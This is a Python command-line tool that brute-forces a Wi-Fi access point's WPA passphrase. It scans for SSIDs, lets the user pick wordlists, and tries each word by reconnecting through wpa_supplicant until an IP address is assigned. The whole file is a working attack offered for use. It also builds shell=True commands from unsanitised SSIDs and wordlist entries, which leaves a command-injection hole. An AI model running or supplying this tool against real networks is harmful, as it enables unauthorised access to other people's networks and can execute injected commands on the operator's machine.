import inquirer, subprocess, os, time, pdb

def select_wireless_interface():
    '''
    Select the Wireless Network Interface to be used to crack the wireless Access Points
    '''
    p1 = subprocess.Popen(('sudo', 'iw', 'dev'), stdout=subprocess.PIPE)
    p2 = subprocess.Popen(('grep', 'Interface'), stdout=subprocess.PIPE, stdin=p1.stdout)
    out, err = p2.communicate()
    rows = out.decode().split('\n')
    wnics = [row.split('Interface')[1] for row in rows if len(row) > 0]
    return ask_question('interface', wnics, "Select the wireless interface")

def select_ssid(interface):
    '''
    Lists the reachable SSIDs to the user and asks to select the one to be cracked
    :param interface: Name of the interface to be used to produce the list of SSIDs
    '''
    p1 = subprocess.Popen(('sudo', 'iw', interface, 'scan'), stdout=subprocess.PIPE)
    p2 = subprocess.Popen(('grep', 'SSID'), stdout=subprocess.PIPE, stdin=p1.stdout)
    out, err = p2.communicate()
    rows = out.decode().split('\n')
    ssids = [row.split(':')[1] for row in rows if len(row) > 0]
    return ask_question('SSID', ssids, "Select the SSID to be cracked")

def select_dictionaries():
    '''
    Select one or more dictionaries whose words will be used as passphrase
    to authenticate with the chosen Access Point
    '''
    #dictionaries = os.listdir('../dictionaries')
    #dictionaries = [os.path.abspath(d) for d in dictionaries]
    path = os.path.abspath(os.path.join(os.path.dirname( __file__ ), '..', 'dictionaries'))
    dictionaries = os.listdir(path)
    dictionaries = ["{}/{}".format(path, d) for d in dictionaries] #add the absolute path
    description_to_name = {} # Map the description of a dictionary to its name
    for dictio in dictionaries:
        desc = get_dictionary_description(dictio)
        description_to_name[desc] = dictio
    selected_descriptions = ask_question('Dictionary', list(description_to_name.keys()), 'Select one or more dictionaries to be used to crack the Wi-Fi password', qtype='checkbox')
    return [description_to_name[description] for description in selected_descriptions]


def get_dictionary_description(filename):
    '''
    Returns the description of the dictionary if present, otherwise returns the filename.
    By convention, the description is the first line of the file and starts with a "#"
    '''
    with open(filename) as f:
        first_line = f.readline()
        return first_line[1:].strip() if first_line[0] == '#' else filename

def ask_question(word, alternatives, message, qtype='list'):
    '''
    Asks a question to the user and returns the result
    :param word: Meaning of the question
    :param alternatives: List of alternatives
    :param message: Message to be shown to the user
    :param qtype: The type of the question: [ list | checkbox ]
    :return The asnwer to the question as a string
    '''
    if qtype == 'checkbox':
        questions = [
        inquirer.Checkbox(word,
                       message=message,
                       choices=alternatives,                 ),
        ]        
        return inquirer.prompt(questions)[word]
    else:
        questions = [
        inquirer.List(word,
                       message=message,
                       choices=alternatives,                 ),
        ]
        return inquirer.prompt(questions)[word].strip()

def progressBar(iterable, SSID, prefix = '',  decimals = 1, length = 100, fill = '█', printEnd = "\t\t\r"):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        SSID        - Required  : Service Set Identifier (Str)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
    """
    total = len(iterable)
    # Progress Bar Printing Function
    def printProgressBar (iteration, suffix):
        percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
        filledLength = int(length * iteration // total)
        bar = fill * filledLength + '-' * (length - filledLength)
        if suffix == '':
            print(f'\r{prefix} |{bar}| {percent}% Starting attacks... ', end = printEnd)
        else:
            print(f'\r{prefix} |{bar}| {percent}% Trying passphrase number {iteration}: {suffix}'+(20-len(suffix))*' ', end = printEnd)
    # Initial Call
    printProgressBar(0, '')
    # Update Progress Bar
    for i, item in enumerate(iterable):
        yield item
        printProgressBar(i + 1, item)
    # Print New Line on Complete
    print()

def try_password(interface, SSID, psw):
    '''
    Tries the password "psw" to crack the wireless access point "SSID" using the interface "interface"
    '''
    subprocess.Popen('sudo killall wpa_supplicant', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    subprocess.Popen("ifconfig {} down".format(interface), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    subprocess.Popen("ifconfig {} up".format(interface), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    subprocess.Popen('wpa_passphrase {} {} > wpa_supplicant.conf'.format(SSID, psw), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    proc = subprocess.Popen('sudo wpa_supplicant -B -i {} -c wpa_supplicant.conf'.format(interface), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    std_out, std_err = proc.communicate()
    time.sleep(10)
    proc = subprocess.Popen('iwconfig wlan0 | grep -w Rate', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    proc = subprocess.Popen('ifconfig {} | grep -w inet'.format(interface), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    std_out, std_err = proc.communicate()
    connected = len(std_out)>0
    return connected

def print_success_message(SSID, passphrase):
    print("\nWifi cracked: the passphrase for {} is {}".format(SSID, passphrase))

def crack_using_dictionary_words(dictfile, interface, ssid):
    '''Try to crack the Wi-Fi password using the words contained in the file "dictfile"'''
    with open(dictfile, 'r') as file:
        words = [word.strip() for word in file.readlines()[1:]] #Discard first line, used to describe the dictionary of words
        for word in progressBar(words, prefix = 'Progress:', length = 50, SSID=ssid):
            connected = try_password(interface, ssid, word)
            if connected:       
                return True, word
    return False, None
            
interface = select_wireless_interface()
ssid = select_ssid(interface)
dicts = select_dictionaries()
for dictfile in dicts:
    cracked, passphrase = crack_using_dictionary_words(dictfile, interface, ssid)
    if cracked:
        print_success_message(ssid, passphrase)
        break

